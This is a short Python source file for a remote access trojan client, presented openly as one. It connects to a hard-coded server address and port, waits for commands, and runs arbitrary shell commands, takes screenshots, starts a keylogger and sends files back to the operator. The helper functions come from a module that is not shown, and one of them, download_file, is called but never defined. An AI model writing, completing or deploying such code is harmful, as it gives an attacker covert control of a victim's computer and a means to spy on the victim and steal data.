import socket
from features import execute_command, capture_screenshot, keylogger_start

SERVER_HOST = "192.168.0.10"  # Replace with your server IP
SERVER_PORT = 9001

def start_client():
    """Start the RAT client."""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_HOST, SERVER_PORT))

    while True:
        try:
            command = client.recv(1024).decode()
            if command == "screenshot":
                result = capture_screenshot()
            elif command == "keylogger":
                result = keylogger_start()
            elif command.startswith("download"):
                filepath = command.split(" ", 1)[1]
                result = download_file(filepath, client)
            elif command == "exit":
                break
            else:
                result = execute_command(command)
            
            client.send(result.encode())
        except Exception as e:
            client.send(f"Error: {str(e)}".encode())
            break

    client.close()

if __name__ == "__main__":
    start_client()
